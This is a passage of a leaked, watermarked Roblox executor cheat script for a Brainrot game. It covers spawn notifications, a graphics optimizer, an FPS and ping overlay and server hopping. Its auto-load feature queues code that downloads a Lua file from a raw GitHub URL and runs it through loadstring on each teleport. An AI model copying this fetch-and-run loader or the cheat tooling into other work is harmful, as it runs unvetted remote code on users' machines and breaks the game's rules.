			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local sliced22 = nil

		for _, sliced23 in ipairs(sliced20) do
			if (sliced23.IsNew or sliced23.IsLateValue) and sliced23.Value >= slicedn7 then
				tbl14[#tbl14 + 1] = sliced23

				if sliced23.Value > slicedn10 and (not sliced22 or sliced23.Value > sliced22.Value) then
					sliced22 = sliced23
				end
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedn8 = sliced21

		if flag6 and sliced22 then
			slicedfn50(sliced22)
		elseif not flag6 then
			table.sort(tbl14, function(arg, arg2)
				return arg.Value > arg2.Value
			end)

			for _, sliced23 in ipairs(tbl14) do
				slicedfn50(sliced23)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
	end

	local function slicedfn53()
		flag5 = false

		if connection then
			connection:Disconnect()
			connection = nil
		end
	end

	local function slicedfn54()  -- LEAKED BY SLICED | discord.gg/pubmethod
		slicedfn53()
		slicedfn51()
		flag5 = true
		slicedn9 = os.clock() + slicedn5

		connection = RunService.Heartbeat:Connect(function()
			if not flag5 or os.clock() < slicedn9 then
				return
			end
			slicedn9 = os.clock() + slicedn5
			pcall(slicedfn52)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end)
	end

	local function slicedfn55()
		slicedfn53()

		for i_ = #tbl9, 1, -1 do
			local sliced20 = tbl9[i_]

			if sliced20 and sliced20.Parent then
				sliced20:Destroy()
			end

			tbl9[i_] = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if sliced17 and sliced17.Parent then
			sliced17:Destroy()
		end

		sliced17 = nil
		sliced18 = nil
	end

	sliced15.Event:Connect(slicedfn55)
	chilliBrainrotNotificationRuntim.Destroying:Connect(slicedfn55)

	sliced10:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
		Name = "Brainrot Notifications",
		Default = false,
		Callback = function(arg)
			if arg then
				slicedfn54()
			else
				slicedfn53()
			end
		end,
	})  -- LEAKED BY SLICED | discord.gg/pubmethod
end

sliced10:CreateToggle({
	Name = "Only New Highest",
	Note = "Only notifies when the new Brainrot is worth more than every Brainrot already present.",
	Default = true,
	Callback = function(arg)
		flag6 = arg == true
	end,
})

do  -- LEAKED BY SLICED | discord.gg/pubmethod
	local tbl14 = {
		["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
		["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
		["B/s"] = { Min = 1, Max = 1000, Mult = 1e9 },
		["T/s"] = { Min = 1, Max = 1000, Mult = 1e12 },
	}

	local sliced20 = nil
	local slicedn10 = 1
	local str4 = "M/s"

	local function slicedfn32(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		if arg ~= nil then
			slicedn10 = math.floor(tonumber(arg) or slicedn10)
		end

		if arg2 ~= nil then
			str4 = tostring(arg2)
		elseif sliced20 and sliced20.GetUnit then
			local unit = sliced20:GetUnit()

			if unit and unit ~= "" then
				str4 = tostring(unit)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedn7 = slicedn10 * (tbl14[str4] or tbl14["M/s"]).Mult
	end

	local function slicedfn33(arg)
		str4 = tostring(arg)
		local ms = tbl14[str4] or tbl14["M/s"]

		if sliced20 and sliced20.SetRange then
			sliced20:SetRange(ms.Min, ms.Max)
			local min = sliced20:Get() or ms.Min
			local min2 = ms.Min  -- LEAKED BY SLICED | discord.gg/pubmethod
			local max = ms.Max
			local slicedn11 = math.clamp(math.floor(min + 0.5), min2, max)

			if slicedn11 ~= min then
				sliced20:Set(slicedn11)
			else
				slicedfn32(slicedn11, str4)
			end
		else
			slicedfn32(nil, str4)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	sliced20 = sliced10:CreateSlider({
		Name = "Notification Min Value",
		Note = "Ignores newly spawned Brainrots below this generation value.",
		Min = 0,
		Max = 1000,
		Default = 0,
		AllowDecimals = false,
		Increment = 1,
		Unit = {  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s", "T/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				slicedfn33(arg)
			end,
		},
		Quick = false,  -- LEAKED BY SLICED | discord.gg/pubmethod
		Callback = function(arg)
			slicedfn32(arg, nil)
		end,
	})
end

sliced10:CreateInput({
	Name = "Notification Sound ID",
	Note = "Enter an audio asset ID, then press Apply Sound ID.",
	Placeholder = "rbxassetid://123456789",
	Default = "rbxassetid://110902246151945",  -- LEAKED BY SLICED | discord.gg/pubmethod
	MaxLength = 40,
	Callback = function(arg)
		slicedfn30(arg)
	end,
})

sliced10:CreateButton({
	Name = "Apply Sound ID",
	ButtonText = "Apply",
	Callback = function()
		task.spawn(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn31()
		end)
	end,
})

local sliced20 = Misc:CreateSection({ Name = "Performance", Expanded = true })
local flag7 = false

sliced20:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,  -- LEAKED BY SLICED | discord.gg/pubmethod
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Quick = false,
	Callback = function(arg)
		local slicedn10 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)

		if type(setfpscap) == "function" then
			if pcall(setfpscap, slicedn10) then
				flag7 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
		end

		if not flag7 then
			flag7 = true
			v.Notify("FPS Cap Unavailable", "This environment does not support setfpscap.", 5)
		end
	end,
})

local flag8, slicedn10, thread  -- LEAKED BY SLICED | discord.gg/pubmethod

do
	local slicedn11 = 300
	flag8 = false
	slicedn10 = 0
	thread = nil
	local tbl14 = {}
	local tbl15 = {}
	local obj3 = setmetatable({}, { __mode = "k" })
	local chilliOptimizerRuntime = CoreGui:FindFirstChild("__ChilliOptimizerRuntime")

	if chilliOptimizerRuntime then  -- LEAKED BY SLICED | discord.gg/pubmethod
		local cleanup = chilliOptimizerRuntime:FindFirstChild("Cleanup")

		if cleanup and cleanup:IsA("BindableEvent") then
			pcall(function()
				cleanup:Fire()
			end)
		end

		pcall(function()
			chilliOptimizerRuntime:Destroy()
		end)
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local folder = Instance.new("Folder")
	folder.Name = "__ChilliOptimizerRuntime"
	folder.Archivable = false
	folder.Parent = CoreGui
	local bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = folder

	local function slicedfn32(arg, arg2, arg3)
		local ok, result = pcall(arg)
		if not ok then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return
		end
		tbl15[#tbl15 + 1] = { Setter = arg2, Value = result }
		pcall(arg2, arg3)
	end

	local function slicedfn33(arg, arg2, arg3)
		local tbl16 = obj3[arg]

		if not tbl16 then
			tbl16 = {}
			obj3[arg] = tbl16  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if tbl16[arg2] == nil then
			local ok, result = pcall(function()
				return arg[arg2]
			end)

			if not ok then
				return
			end
			tbl16[arg2] = { Value = result }
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		pcall(function()
			arg[arg2] = arg3
		end)
	end

	local function slicedfn34(arg)
		if not flag8 or not arg.Parent then
			return
		end

		if obj[arg] then
			return  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if arg:IsA("ParticleEmitter") then
			slicedfn33(arg, "Enabled", false)
			slicedfn33(arg, "Rate", 0)
		elseif arg:IsA("Trail") or arg:IsA("Beam") then
			slicedfn33(arg, "Enabled", false)
		elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
			slicedfn33(arg, "Enabled", false)
			slicedfn33(arg, "Brightness", 0)
		elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn33(arg, "Enabled", false)
		elseif arg:IsA("Explosion") then
			slicedfn33(arg, "Visible", false)
		elseif arg:IsA("SpecialMesh") then
			slicedfn33(arg, "TextureId", "")
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
				slicedfn33(arg, "Transparency", 1)
			end
		elseif arg:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn33(arg, "CastShadow", false)
			slicedfn33(arg, "Material", Enum.Material.Plastic)
			slicedfn33(arg, "Reflectance", 0)
		elseif arg:IsA("PostEffect") then
			slicedfn33(arg, "Enabled", false)
		elseif arg:IsA("Atmosphere") then
			slicedfn33(arg, "Density", 0)
			slicedfn33(arg, "Haze", 0)
			slicedfn33(arg, "Glare", 0)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn35()
		for _, sliced21 in ipairs(tbl14) do
			if sliced21.Connected then
				sliced21:Disconnect()
			end
		end

		table.clear(tbl14)
	end

	local function slicedfn36()  -- LEAKED BY SLICED | discord.gg/pubmethod
		local rendering = settings().Rendering
		local terrain = Workspace.Terrain

		slicedfn32(function()
			return Workspace.StreamingEnabled
		end, function(streamingEnabled)
			Workspace.StreamingEnabled = streamingEnabled
		end, true)

		slicedfn32(function()
			return Workspace.StreamingMinRadius
		end, function(streamingMinRadius)  -- LEAKED BY SLICED | discord.gg/pubmethod
			Workspace.StreamingMinRadius = streamingMinRadius
		end, 64)

		slicedfn32(function()
			return Workspace.StreamingTargetRadius
		end, function(streamingTargetRadius)
			Workspace.StreamingTargetRadius = streamingTargetRadius
		end, 256)

		slicedfn32(function()
			return Workspace.StreamingIntegrityMode
		end, function(streamingIntegrityMode)  -- LEAKED BY SLICED | discord.gg/pubmethod
			Workspace.StreamingIntegrityMode = streamingIntegrityMode
		end, Enum.StreamingIntegrityMode.MinimumRadiusPause)

		slicedfn32(function()
			return rendering.QualityLevel
		end, function(qualityLevel)
			rendering.QualityLevel = qualityLevel
		end, Enum.QualityLevel.Level01)

		slicedfn32(function()
			return rendering.MeshPartDetailLevel
		end, function(meshPartDetailLevel)  -- LEAKED BY SLICED | discord.gg/pubmethod
			rendering.MeshPartDetailLevel = meshPartDetailLevel
		end, Enum.MeshPartDetailLevel.Level01)

		slicedfn32(function()
			return rendering.EditQualityLevel
		end, function(editQualityLevel)
			rendering.EditQualityLevel = editQualityLevel
		end, Enum.QualityLevel.Level01)

		slicedfn32(function()
			return Lighting.GlobalShadows
		end, function(globalShadows)  -- LEAKED BY SLICED | discord.gg/pubmethod
			Lighting.GlobalShadows = globalShadows
		end, false)

		slicedfn32(function()
			return Lighting.FogEnd
		end, function(fogEnd)
			Lighting.FogEnd = fogEnd
		end, 9e9)

		slicedfn32(function()
			return Lighting.Technology
		end, function(technology)  -- LEAKED BY SLICED | discord.gg/pubmethod
			Lighting.Technology = technology
		end, Enum.Technology.Legacy)

		slicedfn32(function()
			return Lighting.EnvironmentDiffuseScale
		end, function(environmentDiffuseScale)
			Lighting.EnvironmentDiffuseScale = environmentDiffuseScale
		end, 0)

		slicedfn32(function()
			return Lighting.EnvironmentSpecularScale
		end, function(environmentSpecularScale)  -- LEAKED BY SLICED | discord.gg/pubmethod
			Lighting.EnvironmentSpecularScale = environmentSpecularScale
		end, 0)

		slicedfn32(function()
			return terrain.Decoration
		end, function(decoration)
			terrain.Decoration = decoration
		end, false)

		slicedfn32(function()
			return terrain.WaterWaveSize
		end, function(waterWaveSize)  -- LEAKED BY SLICED | discord.gg/pubmethod
			terrain.WaterWaveSize = waterWaveSize
		end, 0)

		slicedfn32(function()
			return terrain.WaterWaveSpeed
		end, function(waterWaveSpeed)
			terrain.WaterWaveSpeed = waterWaveSpeed
		end, 0)

		slicedfn32(function()
			return terrain.WaterReflectance
		end, function(waterReflectance)  -- LEAKED BY SLICED | discord.gg/pubmethod
			terrain.WaterReflectance = waterReflectance
		end, 0)

		slicedfn32(function()
			return terrain.WaterTransparency
		end, function(waterTransparency)
			terrain.WaterTransparency = waterTransparency
		end, 1)
	end

	local function slicedfn37(arg, arg2)
		local descendants = arg:GetDescendants()  -- LEAKED BY SLICED | discord.gg/pubmethod

		for i_, descendant in ipairs(descendants) do
			if not flag8 or slicedn10 ~= arg2 then
				return false
			end
			slicedfn34(descendant)

			if i_ % slicedn11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end

		return true  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn38()
		local slicedn12 = 0

		for k, sliced21 in pairs(obj3) do
			if k.Parent then
				for k2, sliced22 in pairs(sliced21) do
					pcall(function()
						k[k2] = sliced22.Value
					end)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			obj3[k] = nil
			slicedn12 += 1

			if slicedn12 % slicedn11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end
	end

	local function slicedfn39()
		if not flag8 then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return
		end
		flag8 = false
		slicedn10 += 1
		slicedfn35()

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		slicedfn38()  -- LEAKED BY SLICED | discord.gg/pubmethod

		for i_ = #tbl15, 1, -1 do
			local sliced21 = tbl15[i_]
			pcall(sliced21.Setter, sliced21.Value)
		end

		table.clear(tbl15)
	end

	local function slicedfn40()
		if flag8 then
			return
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
		flag8 = true
		slicedn10 += 1
		local sliced21 = slicedn10
		slicedfn36()

		tbl14[#tbl14 + 1] = Workspace.DescendantAdded:Connect(function(descendant)
			if flag8 and slicedn10 == sliced21 then
				task.defer(function()
					if flag8 and slicedn10 == sliced21 then
						slicedfn34(descendant)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end
		end)

		tbl14[#tbl14 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
			if flag8 and slicedn10 == sliced21 then
				task.defer(function()
					if flag8 and slicedn10 == sliced21 then
						slicedfn34(descendant)
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end)

		thread = task.spawn(function()
			if not slicedfn37(Workspace, sliced21) then
				return
			end
			slicedfn37(Lighting, sliced21)
		end)
	end

	bindableEvent.Event:Connect(slicedfn39)  -- LEAKED BY SLICED | discord.gg/pubmethod
	folder.Destroying:Connect(slicedfn39)

	sliced20:CreateToggle({
		Name = "Optimizer",
		Default = false,
		Callback = function(arg)
			if arg then
				slicedfn40()
			else
				slicedfn39()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end,
	})
end

do
	local flag9 = false
	local connection2 = nil
	local connection3 = nil
	local tbl14 = {}
	local tbl15 = {}

	local function slicedfn32(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
		return arg:IsA("Accessory") or arg:IsA("Clothing") or arg:IsA("ShirtGraphic")
	end

	local function slicedfn33(arg)
		if flag9 and arg.Parent and slicedfn32(arg) then
			pcall(function()
				arg:Destroy()
			end)
		end
	end

	local function slicedfn34(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
		if not flag9 or not arg then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			slicedfn33(descendant)
		end
	end

	local function slicedfn35(player)
		local sliced21 = tbl14[player]

		if sliced21 then  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced21:Disconnect()
			tbl14[player] = nil
		end

		local sliced22 = tbl15[player]

		if sliced22 then
			sliced22:Disconnect()
			tbl15[player] = nil
		end
	end

	local function slicedfn36(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced21 = tbl14[arg]

		if sliced21 then
			sliced21:Disconnect()
		end

		tbl14[arg] = arg2.DescendantAdded:Connect(function(descendant)
			if flag9 and slicedfn32(descendant) then
				task.defer(slicedfn33, descendant)
			end
		end)

		slicedfn34(arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn37(player)
		slicedfn35(player)

		tbl15[player] = player.CharacterAdded:Connect(function(character_)
			if flag9 then
				slicedfn36(player, character_)
			end
		end)

		if player.Character then
			slicedfn36(player, player.Character)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
	end

	local function slicedfn38()
		flag9 = false

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			connection3 = nil
		end

		for k in pairs(tbl15) do
			slicedfn35(k)
		end

		for k in pairs(tbl14) do
			slicedfn35(k)
		end
	end

	local function slicedfn39()  -- LEAKED BY SLICED | discord.gg/pubmethod
		if flag9 then
			return
		end
		flag9 = true
		connection2 = Players.PlayerAdded:Connect(slicedfn37)
		connection3 = Players.PlayerRemoving:Connect(slicedfn35)

		for _, player in ipairs(Players:GetPlayers()) do
			slicedfn37(player)
		end
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	slicedfn2(slicedfn38)

	sliced20:CreateToggle({
		Name = "Hide Player Cosmetics",
		Default = false,
		Callback = function(arg)
			if arg then
				slicedfn39()
			else
				slicedfn38()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end,
	})
end

local name = "ChilliFpsPingGui"
local slicedn11 = 132
local slicedn12 = 0.085
local slicedn13 = 0.2
local slicedn14 = 8
local slicedfn32, slicedfn33
local sliced21 = sliced2:CreateState({ Name = "FPS and Ping Position", Default = {} })  -- LEAKED BY SLICED | discord.gg/pubmethod

slicedfn32 = function()
	local sliced22 = sliced21:Get()
	if type(sliced22) == "table" and type(sliced22.XOffset) == "number" and type(sliced22.YOffset) == "number" then
		return UDim2.new(tonumber(sliced22.XScale) or 0, sliced22.XOffset, tonumber(sliced22.YScale) or 0, sliced22.YOffset)
	end
	return UDim2.new(0, 16, 0, 16)
end

slicedfn33 = function(arg)
	sliced21:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
end  -- LEAKED BY SLICED | discord.gg/pubmethod

local color = Color3.fromRGB(58, 255, 55)

do
	local color2 = Color3.fromRGB(255, 214, 84)
	local color3 = Color3.fromRGB(255, 96, 96)
	local color4 = Color3.fromRGB(150, 150, 158)
	local flag9 = false
	local tbl14 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
	local sliced22 = nil
	local sliced23 = nil
	local slicedn15 = 1
	local slicedn16 = 0
	local slicedn17 = 0
	local sliced24 = nil
	local sliced25 = nil
	local gothamBold = Enum.Font.GothamBold

	pcall(function()
		gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end)

	local function slicedfn34(arg)
		if typeof(gothamBold) == "Font" then
			arg.FontFace = gothamBold
		else
			arg.Font = Enum.Font.GothamBold
		end
	end

	local function slicedfn35(arg)
		if arg >= 100 then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return color
		end

		if arg >= 50 then
			return color2
		end
		return color3
	end

	local function slicedfn36(arg)
		if arg <= 90 then
			return color  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if arg <= 180 then
			return color2
		end
		return color3
	end

	local function slicedfn37()
		if not uiScale then
			return
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
		local currentCamera = Workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * slicedn12 / slicedn11, 0.7, 1.4) * slicedn15
	end

	local function slicedfn38()
		for _, sliced26 in ipairs(tbl14) do
			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced26:Disconnect()
			end)
		end

		table.clear(tbl14)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame = nil
		uiScale = nil
		sliced22 = nil
		sliced23 = nil
		sliced24 = nil
		sliced25 = nil
		slicedn16 = 0
	end

	local function createTextLabel(parent, arg, arg2, textXAlignment, textColor3)
		local textLabel = Instance.new("TextLabel")  -- LEAKED BY SLICED | discord.gg/pubmethod
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = textXAlignment
		slicedfn34(textLabel)
		textLabel.Parent = parent
		return textLabel  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn39()
		slicedfn38()
		local sliced26 = CoreGui

		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			ok = ok and typeof(result) == "Instance"
			local sliced27 = CoreGui

			if ok then
				sliced26 = result  -- LEAKED BY SLICED | discord.gg/pubmethod
			else
				sliced26 = sliced27
			end
		end

		local chilliFpsPingGui = sliced26:FindFirstChild("ChilliFpsPingGui")

		if chilliFpsPingGui then
			pcall(function()
				chilliFpsPingGui:Destroy()
			end)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = sliced26
		frame = Instance.new("Frame")
		frame.Active = true
		frame.AnchorPoint = Vector2.new(0, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = slicedfn32()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Parent = frame
		slicedfn37()
		sliced22 = createTextLabel(frame, 12, 34, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 48, 22, Enum.TextXAlignment.Left, color4).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		sliced23 = createTextLabel(frame, 82, 30, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 113, 14, Enum.TextXAlignment.Left, color4).Text = "ms"
		local currentCamera = Workspace.CurrentCamera

		if currentCamera then
			tbl14[#tbl14 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn37)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local flag10 = false
		local sliced27 = nil
		local vector2 = Vector2.new(0, 0)
		local position = nil

		tbl14[#tbl14 + 1] = frame.InputBegan:Connect(function(input)
			if flag10 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local flag11 = input.UserInputType == Enum.UserInputType.Touch  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag11 then
				return
			end
			local vector22 = Vector2.new(input.Position.X, input.Position.Y)
			local absolutePosition = frame.AbsolutePosition
			local absoluteSize = frame.AbsoluteSize
			if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
				return
			end
			flag10 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced27 = flag11 and input or nil
			vector2 = vector22
			position = frame.Position
		end)

		tbl14[#tbl14 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag10 or not frame or not position then
				return
			end

			if not (sliced27 and input == sliced27 or not sliced27 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local slicedn18 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + slicedn18.X, position.Y.Scale, position.Y.Offset + slicedn18.Y)
		end)

		tbl14[#tbl14 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag10 then
				return
			end
			local flag11 = sliced27 and input == sliced27
			local flag12  -- LEAKED BY SLICED | discord.gg/pubmethod

			if flag11 then
				flag12 = flag11
			else
				flag12 = not sliced27 and input.UserInputType == Enum.UserInputType.MouseButton1
			end

			if flag12 then
				flag10 = false
				sliced27 = nil
				position = nil
				slicedfn33(frame.Position)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end)

		tbl14[#tbl14 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag9 or not sliced22 then
				return
			end
			local slicedn18 = math.clamp(deltaTime, 0.001, 1)
			local slicedn19 = 1 / slicedn18

			if slicedn16 <= 0 then
				slicedn16 = slicedn19  -- LEAKED BY SLICED | discord.gg/pubmethod
			else
				slicedn16 += (slicedn19 - slicedn16) * (1 - math.exp(-slicedn18 * slicedn14))
			end

			local now = os.clock()
			if now < slicedn17 then
				return
			end
			slicedn17 = now + slicedn13
			local slicedn20 = math.floor(slicedn16 + 0.5)
			local text = tostring(slicedn20)  -- LEAKED BY SLICED | discord.gg/pubmethod

			if text ~= sliced24 then
				sliced24 = text
				sliced22.Text = text
				sliced22.TextColor3 = slicedfn35(slicedn20)
			end

			local slicedn21 = 0

			pcall(function()
				slicedn21 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local slicedn22 = math.floor(slicedn21 + 0.5)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local text2 = tostring(slicedn22)

			if text2 ~= sliced25 then
				sliced25 = text2
				sliced23.Text = text2
				sliced23.TextColor3 = slicedfn36(slicedn22)
			end
		end)
	end

	sliced20:CreateSlider({
		Name = "FPS and Ping Size",  -- LEAKED BY SLICED | discord.gg/pubmethod
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = sliced20:CreateToggle({
			Name = "FPS and Ping",
			Note = "Shows a small draggable readout of frame rate and ping.",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = true,
			Callback = function(arg)
				flag9 = arg == true

				if flag9 then
					slicedfn39()
				else
					slicedfn38()
				end
			end,
		}),  -- LEAKED BY SLICED | discord.gg/pubmethod
		Callback = function(arg)
			slicedn15 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			slicedfn37()
		end,
	})

	slicedfn2(slicedfn38)
end

do
	local sliced22 = Server:CreateSection({ Name = "Server", Expanded = true })

	local function slicedfn34()  -- LEAKED BY SLICED | discord.gg/pubmethod
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function slicedfn35(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if not arg then
			return true  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
		local sliced23 = slicedfn34()
		if not sliced23 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(sliced23, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true  -- LEAKED BY SLICED | discord.gg/pubmethod
end)
if enabled then
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end  -- LEAKED BY SLICED | discord.gg/pubmethod
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local sliced23 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

	sliced23 = sliced22:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag9 = arg == true

			if not slicedfn35(flag9) and flag9 then
				task.defer(function()
					slicedfn35(false)

					if sliced23 and sliced23:Get() == true then
						sliced23:Set(false, false)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					v.Notify("Auto Load Unavailable", "This executor does not support queue on teleport.", 5)
				end)
			end
		end,
	})

	local str4 = "Most Players"
	local flag9 = false

	sliced22:CreateDropdown({
		Name = "Server Hop Mode",  -- LEAKED BY SLICED | discord.gg/pubmethod
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Most Players",
		Quick = false,
		Callback = function(arg)
			str4 = tostring(arg or "Most Players")
		end,
	})

	sliced22:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",  -- LEAKED BY SLICED | discord.gg/pubmethod
		Callback = function()
			if flag9 then
				return
			end
			flag9 = true

			task.spawn(function()
				local sliced24 = str4
				local str5 = tostring(game.JobId or "")
				local tbl14 = {}
